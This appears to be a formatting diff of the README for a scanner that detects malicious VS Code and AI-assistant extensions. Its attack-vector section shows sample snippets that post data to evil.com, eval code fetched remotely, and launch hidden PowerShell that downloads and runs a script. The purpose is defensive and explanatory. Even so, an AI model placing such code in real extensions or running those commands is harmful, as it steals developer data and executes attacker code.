@@ -22,7 +22,16 @@ The scanner automatically categorizes extensions and adjusts expectations:
 
 |Category|Examples|Expected Behaviors|
 |--|--|--|
-|AI Assistant|Copilot, Codeium, Kilo Code|Network, process spawn, env access||Language Support|ms-python, rust-analyzer, Go|Process spawn, dynamic require||Developer Tools|Code Runner, REST Client, Live Server|Process spawn, network requests||Remote Development|Remote-SSH, Dev Containers, WSL|SSH, network, process spawn||Testing|Jest Runner, Test Explorer|Process spawn||Notebook|Jupyter|Kernel spawn, network||Debugger|Node Debug, Python Debug|Process spawn||Linter|ESLint, Prettier|Process spawn||SCM|GitLens, Git Graph|Git credentials access||Theme|Color themes, icon themes|Minimal runtime|
+|AI Assistant|Copilot, Codeium, Kilo Code|Network, process spawn, env access|
+|Language Support|ms-python, rust-analyzer, Go|Process spawn, dynamic require|
+|Developer Tools|Code Runner, REST Client, Live Server|Process spawn, network requests|
+|Remote Development|Remote-SSH, Dev Containers, WSL|SSH, network, process spawn|
+|Testing|Jest Runner, Test Explorer|Process spawn|
+|Notebook|Jupyter|Kernel spawn, network|
+|Debugger|Node Debug, Python Debug|Process spawn|
+|Linter|ESLint, Prettier|Process spawn|
+|SCM|GitLens, Git Graph|Git credentials access|
+|Theme|Color themes, icon themes|Minimal runtime|
 
 **Real-World Attack Prevention**
 
@@ -47,7 +56,7 @@ Detected by flagging:
 **Extending the Scanner**
 Adding Custom YARA Rules
 Create custom_rules.yar:
-
+```
 rule custom_exfil_detection {
     meta:
         description = "Custom data exfiltration pattern"
@@ -59,9 +68,10 @@ rule custom_exfil_detection {
     condition:
         any of them
 }
-
+```
 Run with custom rules:
 
+```
 ai-plugin-scanner scan --yara-rules ./custom_rules.yar extension.vsix
 Programmatic API
 import { Scanner, JsonReporter, SarifReporter } from 'ai-plugin-scanner';
@@ -76,11 +86,12 @@ console.log(jsonReporter.generate(report));
 // Generate SARIF report
 const sarifReporter = new SarifReporter();
 console.log(sarifReporter.generate(report));
+```
 
 **Understanding Attack Vectors**
 **1. Permission Abuse**
 Extensions request permissions beyond their needs:
-
+```
 {
   "activationEvents": ["*"],  // Runs on every action
   "main": "./extension.js",
@@ -91,11 +102,13 @@ Extensions request permissions beyond their needs:
     }]
   }
 }
+```
 A theme extension should not have a main entry point or wildcard activation.
 
 **2. Obfuscated Code**
 Malicious code often uses obfuscation:
 
+```
 const _0x4b4334 = _0x41e2;
 (function(_0x4b4334, _0x2656ab) {
     const _0x1da43d = function(_0x5b8d73) {
@@ -105,10 +118,11 @@ const _0x4b4334 = _0x41e2;
     };
     // ...obfuscated malicious payload
 })();
+```
 
 **3. Data Exfiltration**
 Extensions sending data to external servers:
-
+```
 const vscode = require('vscode');
 const https = require('https');
 
@@ -118,10 +132,11 @@ function activate(context) {
         https.post('https://evil.com/exfil', { data });
     });
 }
+```
 
 **4. Remote Code Execution**
 Dynamic code execution from external sources:
-
+```
 const https = require('https');
 
 function activate(context) {
@@ -131,15 +146,18 @@ function activate(context) {
         res.on('end', () => eval(code));
     });
 }
+```
+
 **5. Process Spawning**
 Launching external processes:
-
+```
 const { exec } = require('child_process');
 
 function activate(context) {
     exec('powershell -WindowStyle Hidden -Command "irm https://evil.com/script | iex"', 
          { windowsHide: true });
 }
+```
 
 **Best Practices**
 For Developers
@@ -161,6 +179,7 @@ For Organizations
 
 
 **Testing**
+```
 # Run test suite
 npm test
 
@@ -172,18 +191,18 @@ npm test -- --grep "obfuscation detection"
 
 # Integration tests
 npm run test:integration
-
+```
 
 **Related Tools**
-vsix-audit - Trail of Bits VS Code extension scanner
-https://github.com/trailofbits/vsix-audit
-IDE-SHEPHERD - Datadog's real-time IDE monitoring
-https://github.com/DataDog/IDE-Shepherd-extension
-extension-guard - Multi-IDE security scanner
-https://microsoftedge.microsoft.com/addons/detail/extension-guard/gpghlcmpelienkpbhcjknneohejkpgpg
-Spectra Assure - ReversingLabs marketplace scanner
-https://www.reversinglabs.com/products/software-supply-chain-security
-VSCan - Web-based extension analyzer
+vsix-audit - Trail of Bits VS Code extension scanner\
+https://github.com/trailofbits/vsix-audit \
+IDE-SHEPHERD - Datadog's real-time IDE monitoring\
+https://github.com/DataDog/IDE-Shepherd-extension \
+extension-guard - Multi-IDE security scanner\
+https://microsoftedge.microsoft.com/addons/detail/extension-guard/gpghlcmpelienkpbhcjknneohejkpgpg \
+Spectra Assure - ReversingLabs marketplace scanner\
+https://www.reversinglabs.com/products/software-supply-chain-security \
+VSCan - Web-based extension analyzer\
 https://vscan.dev/
 
 
